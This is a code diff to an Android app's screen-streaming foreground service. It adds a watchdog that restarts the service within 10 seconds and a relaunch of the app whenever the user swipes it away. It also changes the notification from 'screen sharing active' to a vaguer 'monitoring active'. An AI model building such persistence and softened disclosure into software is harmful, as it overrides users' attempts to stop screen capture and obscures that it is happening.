@@ -8,7 +8,9 @@ import android.app.Service
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
 import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 
@@ -39,12 +41,12 @@ class StreamForegroundService : Service() {
                 .apply()
             FlutterServiceBridge.stopAgent()
             releaseWakeLock()
+            ServiceWatchdog.cancel(this)
             stopForeground(STOP_FOREGROUND_REMOVE)
             stopSelfResult(startId)
             return START_NOT_STICKY
         }
 
-        // Starting explicitly means the user/app requested the service.
         getSharedPreferences(PREFS, MODE_PRIVATE)
             .edit()
             .putBoolean(KEY_ENABLED, true)
@@ -65,17 +67,15 @@ class StreamForegroundService : Service() {
                 startForeground(NOTIFICATION_ID, notification)
             }
         } catch (e: Exception) {
-            // Keep the service from crashing repeatedly if the OS rejects an
-            // FGS start because of a platform restriction.
             stopSelfResult(startId)
             return START_NOT_STICKY
         }
 
         acquireWakeLock()
 
-        // The Flutter engine is created by CameraParentApplication. Delay the
-        // bridge call slightly so the Dart method handler has time to attach.
-        android.os.Handler(mainLooper).postDelayed({
+        ServiceWatchdog.scheduleNext(this)
+
+        Handler(Looper.getMainLooper()).postDelayed({
             if (!isStopped()) {
                 FlutterServiceBridge.startAgent()
             }
@@ -112,6 +112,7 @@ class StreamForegroundService : Service() {
             .getBoolean(KEY_ENABLED, false)
 
         if (enabled) {
+            // 1) أعد تشغيل الخدمة
             try {
                 val restart = Intent(applicationContext, StreamForegroundService::class.java)
                     .setAction(ACTION_START)
@@ -120,9 +121,23 @@ class StreamForegroundService : Service() {
                 } else {
                     startService(restart)
                 }
-            } catch (_: Exception) {
-                // START_STICKY remains the platform-level recovery path.
-            }
+            } catch (_: Exception) {}
+
+            // 2) جدول watchdog بعد 10 ثوانٍ فقط (إعادة سريعة)
+            ServiceWatchdog.scheduleNext(applicationContext, 10_000L)
+
+            // 3) حاول إعادة فتح التطبيق
+            try {
+                val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
+                if (launchIntent != null) {
+                    launchIntent.addFlags(
+                        Intent.FLAG_ACTIVITY_NEW_TASK or
+                            Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                            Intent.FLAG_ACTIVITY_SINGLE_TOP
+                    )
+                    startActivity(launchIntent)
+                }
+            } catch (_: Exception) {}
         }
         super.onTaskRemoved(rootIntent)
     }
@@ -159,8 +174,8 @@ class StreamForegroundService : Service() {
         }
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("مشاركة الشاشة نشطة")
-            .setContentText("خدمة البث تعمل في الخلفية")
+            .setContentTitle("مراقبة نشطة")
+            .setContentText("التطبيق يعمل في الخلفية")
             .setSmallIcon(android.R.drawable.ic_menu_camera)
             .apply { if (pendingIntent != null) setContentIntent(pendingIntent) }
             .setOngoing(true)
